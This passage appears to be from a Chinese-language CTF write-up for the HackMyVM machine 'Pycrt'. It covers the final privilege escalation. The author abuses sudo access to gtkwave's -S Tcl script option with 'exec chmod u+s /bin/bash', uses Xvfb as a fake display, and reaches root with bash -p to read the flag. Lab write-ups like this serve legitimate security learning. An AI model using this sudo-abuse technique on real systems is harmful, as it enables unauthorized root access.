--xid=XID              specify XID of window <span class=\"hljs-keyword\">for</span> GtkPlug to connect to\n  -1, --rpcid=RPCID          specify RPCID of GConf session\n  -2, --<span class=\"hljs-built_in\">chdir</span>=DIR            specify new current working directory\n  -3, --restore              restore previous session\n  -4, --rcvar                specify single rc variable values individually\n  -5, --sstexclude           specify sst exclusion filter filename\n  -I, --interactive          interactive VCD mode (filename is shared mem ID)\n  -C, --comphier             use compressed hierarchy names (slower)\n  -g, --giga                 use gigabyte mempacking when recoding (slower)\n  -L, --legacy               use legacy VCD mode rather than the VCD recoder\n  -v, --vcd                  use stdin as a VCD dumpfile\n  -O, --output=FILE          specify filename <span class=\"hljs-keyword\">for</span> stdout/stderr redirect\n  -z, --slider-zoom          <span class=\"hljs-built_in\">enable</span> horizontal slider stretch zoom\n  -V, --version              display version banner <span class=\"hljs-keyword\">then</span> <span class=\"hljs-built_in\">exit</span>\n  -h, --<span class=\"hljs-built_in\">help</span>                 display this <span class=\"hljs-built_in\">help</span> <span class=\"hljs-keyword\">then</span> <span class=\"hljs-built_in\">exit</span>\n  -x, --<span class=\"hljs-built_in\">exit</span>                 <span class=\"hljs-built_in\">exit</span> after loading trace (<span class=\"hljs-keyword\">for</span> loader benchmarks)\n\nVCD files and save files may be compressed with zip or gzip.\nGHW files may be compressed with gzip or bzip2.\nOther formats must remain uncompressed due to their non-linear access.\nNote that DUMPFILE is optional <span class=\"hljs-keyword\">if</span> the --dump or --nocli options are specified.\nSAVEFILE and RCFILE are always optional.\n\nReport bugs to &#x3C;bybell@rocketmail.com>.\n</code></pre>\n<p>其中的 <code>-S</code> 可以执行脚本</p>\n<pre><code class=\"hljs language-bash\">  -S, --script=FILE          specify Tcl <span class=\"hljs-built_in\">command</span> script file <span class=\"hljs-keyword\">for</span> execution\n</code></pre>\n<p>经过查阅发现是 <code>TCL</code> 语言，其中有方法可以执行命令：<a href=\"https://blog.csdn.net/yudingding6197/article/details/44453933\">https://blog.csdn.net/yudingding6197/article/details/44453933</a></p>\n<p>编写脚本</p>\n<pre><code class=\"hljs language-bash\">pycrtlake@PyCrt:~$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"exec chmod u+s /bin/bash\"</span> > shell\n</code></pre>\n<p>提示：</p>\n<pre><code class=\"hljs language-bash\">pycrtlake@PyCrt:~$ <span class=\"hljs-built_in\">sudo</span> /usr/bin/gtkwave -S shell                            \nCould not initialize GTK!  Is DISPLAY <span class=\"hljs-built_in\">env</span> var/xhost <span class=\"hljs-built_in\">set</span>?\n</code></pre>\n<p>大概就是没有图形化而无法运行：<a href=\"https://dev59.com/askubuntu/P0XXs4cB2Jgan1zn2dTY#google_vignette\">https://dev59.com/askubuntu/P0XXs4cB2Jgan1zn2dTY#google_vignette</a></p>\n<p>解决方法：可以使用 <code>Xvfb</code> 来假装一个</p>\n<p><img src=\"/post-images/HackMyVMPycrt/image18.png\" alt=\"image.png\"></p>\n<p>刚好靶机上有</p>\n<pre><code class=\"hljs language-bash\">pycrtlake@PyCrt:~$ <span class=\"hljs-built_in\">which</span> Xvfb\n/usr/bin/Xvfb\n</code></pre>\n<p>梭哈</p>\n<pre><code class=\"hljs language-bash\">pycrtlake@PyCrt:~$ Xvfb :99 -screen 0 1024x768x24 &#x26;\n[1] 1678\npycrtlake@PyCrt:~$ <span class=\"hljs-built_in\">export</span> DISPLAY=:99\npycrtlake@PyCrt:~$ <span class=\"hljs-built_in\">sudo</span> /usr/bin/gtkwave -S shell \n\nGTKWave Analyzer v3.3.118 (w)1999-2023 BSI\n\n(gtkwave:1686): dconf-WARNING **: 12:04:41.029: failed to commit changes to dconf: Failed to execute child process ?dbus-launch? (No such file or directory)\nGTKWAVE | Use the -h, --<span class=\"hljs-built_in\">help</span> <span class=\"hljs-built_in\">command</span> line flags to display <span class=\"hljs-built_in\">help</span>.\nGTKWAVE | Executing Tcl script <span class=\"hljs-string\">'shell'</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">pycrtlake@PyCrt:~$ <span class=\"hljs-built_in\">ls</span> -al /bin/bash\n-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash\npycrtlake@PyCrt:~$ /bin/bash -p\nbash-5.0# <span class=\"hljs-built_in\">id</span>\nuid=1000(pycrtlake) gid=1000(pycrtlake) euid=0(root) <span class=\"hljs-built_in\">groups</span>=1000(pycrtlake),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)\nash-5.0# <span class=\"hljs-built_in\">cat</span> root.txt \nflag{e80ecc46ca5e00bf8a51c47f0cc3e868}\n</code></pre>\n<h2>总结</h2>\n<p>难，提示不多，不太好找路，还是太菜了…</p>\n<p><img src=\"/post-images/HackMyVMPycrt/Sadge-3x.png\" alt=\"Sadge-3x.png\"></p>","title":"HackMyVM - Pycrt","date":"2025-05-12","updated":"2025-05-12","tags":["HackMyVM","Linux靶机","TCL","LFI","IRC"],"categories":"靶机","comments":true,"description":"Pycrt.\n\n https://hackmyvm.eu/machines/machine.php?vm=Pycrt\n \n\nNotes：Have Fun!\n\n前期踩点\n\n\n\n\n\n\n\nWeb 渗透 - 1\n\n常规先对 `80` 端口进行渗透\n\n\n\n目录扫描什么都扫描不出来\n\n\n\n\n\n先放着\n\nInspIRCd\n\n`InspIRCd`是一个功能丰富的C++编写的互联网中继聊天（IRC）服务器，适用于U..."},"recentPosts":[{"id":"HackMyVMSilentdev","title":"HackMyVM - Silentdev","date":"2025-09-26","isEncrypted":false,"year":"2025","month":"09","day":"26"},{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Eureka","title":"HackTheBox - Machine - Eureka","date":"2025-04-28","isEncrypted":false,"year":"2025","month":"09","day":"20"}]},"__N_SSG":true}